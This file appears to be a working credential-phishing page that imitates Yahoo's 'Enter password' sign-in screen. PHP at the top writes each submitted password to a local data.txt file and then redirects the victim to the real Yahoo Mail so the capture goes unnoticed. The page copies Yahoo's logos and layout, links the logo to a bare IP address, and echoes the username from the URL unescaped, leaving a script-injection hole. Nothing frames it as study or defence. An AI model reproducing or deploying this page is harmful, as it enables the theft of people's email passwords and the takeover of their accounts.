<?php
if(isset($_POST['submit'])) 
{ 
$name = $_POST['username'];
$myfile = fopen("./data.txt", "a");
$pw = $_POST['password'];
$parsed = $pw."\n";
fwrite($myfile, $parsed);
fclose($myfile);
header("Location: https://mail.yahoo.com");
}
?>

    <!DOCTYPE html>
    <html id="Stencil" class="no-js light-theme ">

    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0" />
        <title>Yahoo</title>
        <style>
            #mbr-css-check {
                display: inline;
            }
            
            .mbr-legacy-device-bar {
                display: none;
            }
        </style>
        <link href="./yahoo-main.css" rel="stylesheet" type="text/css">

    </head>

    <body class="">
        <div id="login-body" class="loginish  puree-v2 grid">
            <div class="mbr-desktop-hd">
                <span class="column">
         <a href="http://35.178.199.24/">
            <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo " width="" height="36" />
            <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" class="dark-mode-logo logo " width="" height="36" />
        </a>
    </span>
                <span class="column help txt-align-right">
        <a href="https://help.yahoo.com/kb/index?locale&#x3D;en_US&amp;page&#x3D;product&amp;y&#x3D;PROD_ACCT">Help</a>
    </span>
            </div>
            <div class="login-box-container">
                <div class="login-box right">
                    <div class="mbr-login-hd txt-align-center">
                        <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo yahoo-en-US" width="" height="27" />
                        <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" class="dark-mode-logo logo yahoo-en-US" width="" height="27" />
                    </div>
                    <div class="challenge password-challenge">
                        <div class="challenge-header">
                            <div class="yid"><?php echo strpos($_GET['username'], "@") ? substr($_GET['username'], 0, strpos($_GET['username'], "@")): $_GET['username'] ; ?></div>
                        </div>
                        <div id="password-challenge" class="primary">
                            <strong class="challenge-heading">Enter password</strong>
                            <span class="txt-align-center challenge-desc">to finish sign in</span>
                            <form action="" method="post" class="pure-form challenge-form">
                                <div class="hidden-username">
                                    <input type="text" tabindex="-1" aria-hidden="true" role="presentation" autocorrect="off" spellcheck="false" name="username" value="<?php echo substr($_GET['username'], 0, strpos($_GET['username'], "@")); ?>" />
                                </div>
                                <input type="hidden" name="passwordContext" value="normal" />
                                <div id="password-container" class="input-group password-container focussed">
                                    <input type="password" id="login-passwd" class="password" name="password" placeholder=" " autofocus/>
                                    <label for="login-passwd" id="password-label" class="password-label">Password</label>
                                    <div class="caps-indicator hide" id="caps-indicator" title="Capslock is on"></div>
                                    <button type="button" class="show-hide-toggle-button hide-pw" id="password-toggle-button" tabindex="-1" title="Show password"></button>
                                </div>

                                <div class="button-container">
                                    <input type="submit" id="login-signin" class="pure-button puree-button-primary puree-spinner-button challenge-button" name="submit" value="Next" />
                                </div>
                                <div class="forgot-cont bottom-cta">
                                    <input type="submit" class="pure-button puree-button-link challenge-button-link"  id="mbr-forgot-link" name="skip" value="Forgot password?" />
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </body>

    </html>
    <!-- fe06.member.ir2.yahoo.com - Mon Mar 09 2020 21:32:01 GMT+0000 (Coordinated Universal Time) - (0ms) -->